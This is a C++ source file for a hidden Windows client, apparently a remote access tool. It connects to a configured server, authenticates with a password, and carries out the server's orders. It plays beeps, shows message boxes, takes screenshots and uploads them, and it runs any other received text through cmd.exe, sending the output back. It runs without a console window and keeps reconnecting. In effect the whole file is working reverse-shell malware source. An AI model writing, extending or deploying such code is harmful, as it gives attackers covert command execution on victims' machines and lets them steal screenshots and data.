#include "config.h"

#include "include/asio.hpp"
#include "functions.hpp"

#include <string>

#include <vector>
#include <fstream>

#include <thread>
#include <chrono>

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>

//----------

using asio::ip::tcp;
using std::vector;

using std::string;

using std::thread;

//*****

bool program = true;

asio::io_context c_context;
tcp::socket c_socket = tcp::socket(c_context);

tcp::resolver c_resolver = tcp::resolver(c_context);
tcp::resolver::iterator c_endpoint;

//----------

void disconnect() {
	if (c_socket.is_open()) c_socket.close();
	if (!c_context.stopped()) c_context.stop();
}

//----------

void process_commands(asio::io_context& c_context, tcp::socket& c_socket) {
	while (program) {
		string command = read_from_server(c_socket);

		if (command == "failed") {
			disconnect();
			break;
		}

		// Custom commands -->

		else if (command == "beep") {
			string freq = read_from_server(c_socket);
			string duration = read_from_server(c_socket);

			if (freq == "failed" || duration == "failed") {
				break;
			}

			thread(Beep, std::stoi(freq), std::stoi(duration)).detach();

			send_to_server(c_socket, "[Client] Played a beep sound.");
		}

		else if (command == "message") {
			string title = read_from_server(c_socket);
			string message = read_from_server(c_socket);

			if (title == "failed" || message == "failed")
			{
				break;
			}

			thread(show_messagebox, title, message).detach();

			send_to_server(c_socket, "[Client] Showed the message.");
		}

		else if (command == "screenshot") {
			take_screenshot();

			bool sent = send_file_to_server(c_socket, get_temp_ss_loc());

			if (sent) {
				send_to_server(c_socket, "[Client] Screenshot sent.");
			}
		}

		else if (command == "disconnect") {
			program = false;
			disconnect();
			break;
		}

		// Custom commands <--

		else {
			string command_output;

			command += " > " + local_temp;
			execute_command("cmd.exe /C " + command);

			std::this_thread::sleep_for(std::chrono::milliseconds(400));

			try {
				vector<string> lines;

				std::ifstream output_file(local_temp);
				if (!output_file.is_open()) throw std::ios_base::failure("File couldn't open!");

				string temp;

				while (std::getline(output_file, temp)) {
					lines.push_back(temp);
				}

				output_file.close();

				for (string content : lines) {
					command_output += " | " + content + "\n";
				}
			}

			catch (...) {
				command_output = "[Client] No command output was taken." "\n";
			}

			if (command_output == "") command_output = "[Client] Command executed." "\n";

			send_to_server(c_socket, command_output);
		}
	}
}

//----------

int WINAPI WinMain(HINSTANCE hIstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
{
	setup_json();
	string port = std::to_string(int(config_json["port-number"]));;

	while (program) {
		try {
			bool sent;

			c_endpoint = c_resolver.resolve(config_json["ip-adress"], port);
			asio::connect(c_socket, c_endpoint);

			//*****

			sent = send_to_server(c_socket, config_json["password"]);

			if (!sent) {
				disconnect();
				continue;
			}

			if (read_from_server(c_socket) == "OK") {
				process_commands(c_context, c_socket);
			}

			else {
				disconnect();
				std::this_thread::sleep_for(std::chrono::seconds(15));
			}
		}

		catch (...) {
			std::this_thread::sleep_for(std::chrono::seconds(20));
		}
	}

	return 0;
}
